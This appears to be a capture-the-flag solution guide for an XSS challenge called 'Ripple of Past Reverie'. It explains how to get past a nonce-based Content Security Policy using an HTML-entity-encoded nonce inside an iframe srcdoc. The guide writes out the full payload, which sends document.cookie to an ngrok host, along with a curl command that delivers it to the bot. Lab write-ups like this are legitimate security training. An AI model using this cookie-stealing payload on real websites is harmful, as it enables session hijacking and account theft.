# Ripple of Past Reverie - Solution Guide

## Challenge Overview
- **Target URLs**:
  - https://web-ripple-of-past-revirie-a8hd38x0.amt.rs (application)
  - https://web-ripple-of-past-revirie-tfk6tz07.amt.rs (bot submission)
- **Objective**: Exploit XSS to steal the bot's cookie containing the flag
- **Vulnerability**: Nonce-based CSP bypass via iframe srcdoc HTML entity encoding

## Step-by-Step Solution

### 1. Setup Exfil Listener

First, start the query logger in one terminal:

```bash
python tools/query_logger.py --port 8000
```

Keep this running - it will log all incoming requests.

### 2. Start ngrok Tunnel

In another terminal, start ngrok to expose port 8000:

```bash
# If ngrok is not installed, download it from https://ngrok.com/download
# Or extract ngrok-v2.zip if you have it
ngrok http 8000
```

You'll see output like:
```
Forwarding   https://abcd1234.ngrok-free.app -> http://localhost:8000
```

**Copy the HTTPS URL** (e.g., `https://abcd1234.ngrok-free.app`)

### 3. Test Payload Locally (Optional but Recommended)

Test that your payload works locally before submitting to the bot:

```bash
# Replace YOUR_NGROK_URL with your actual ngrok URL
python tools/test_payload.py '<iframe srcdoc="<script nonce=&quot;%&#78;4%&#43;h2wfdFxXix7rCgwhVvA%&#61;%&#61;&quot;>window.location='"'"'https://YOUR_NGROK_URL.ngrok-free.app/?c='"'"'+encodeURIComponent(document.cookie)</script>"></iframe>' --no-headless --wait 8000
```

If working correctly, you should see:
- The browser opens
- Your query_logger.py shows an incoming request with cookie data

### 4. Submit to Real Bot

Once verified locally, submit to the actual bot:

```bash
python tools/submit_bot.py --ngrok-url "https://YOUR_NGROK_URL.ngrok-free.app"
```

### 5. Get the Flag

Watch the `query_logger.py` terminal. Within a few seconds, you should see:

```
[2025-01-16T...] GET /?c=flag%3D...
  - c = flag=amateursCTF{...}
```

The value of parameter `c` is your flag!

## How the Exploit Works

1. **The Vulnerability**: The page has strict CSP with nonce-based script execution
2. **The Bypass**: Using `<iframe srcdoc="...">` with HTML entity encoding:
   - The outer HTML sees the srcdoc attribute value, not the decoded content
   - When the iframe renders, it decodes entities like `%&#78;` → `N`
   - This reconstructs the correct nonce inside the iframe context
   - The script executes and exfiltrates `document.cookie`

3. **The Payload Structure**:
   ```html
   <iframe srcdoc="<script nonce=&quot;[ENCODED_NONCE]&quot;>
     window.location='[NGROK_URL]/?c='+encodeURIComponent(document.cookie)
   </script>"></iframe>
   ```

   The nonce `N4+h2wfdFxXix7rCgwhVvA==` is encoded as:
   - `N` → `%&#78;`
   - `4` → `4`
   - `+` → `%&#43;`
   - `=` → `%&#61;`

## Troubleshooting

### "No requests received in query_logger"
- Check that ngrok is running and showing "Session Status: online"
- Verify the ngrok URL is HTTPS (not HTTP)
- Try submitting again (bot has 10/min rate limit)

### "403 Forbidden" or other errors
- Check the bot URL is correct
- Ensure you're not hitting rate limits
- Try the alternate URL (a8hd38x0 vs tfk6tz07)

### "Payload doesn't work locally"
- Make sure PHP is installed and in PATH
- Check that render.php exists
- Verify playwright is installed: `pip install playwright && python -m playwright install chromium`

## Quick Commands Reference

```bash
# Terminal 1: Start listener
python tools/query_logger.py --port 8000

# Terminal 2: Start ngrok
ngrok http 8000

# Terminal 3: Submit to bot (replace NGROK_URL)
python tools/submit_bot.py --ngrok-url "https://YOUR_NGROK_URL.ngrok-free.app"
```

## Alternative: Manual Submission

You can also submit via curl:

```bash
curl -X POST https://web-ripple-of-past-revirie-tfk6tz07.amt.rs/ \
  -d 'username=<iframe srcdoc="<script nonce=&quot;%&#78;4%&#43;h2wfdFxXix7rCgwhVvA%&#61;%&#61;&quot;>window.location='"'"'https://YOUR_NGROK_URL/?c='"'"'+encodeURIComponent(document.cookie)</script>"></iframe>'
```

Good luck! 🚀
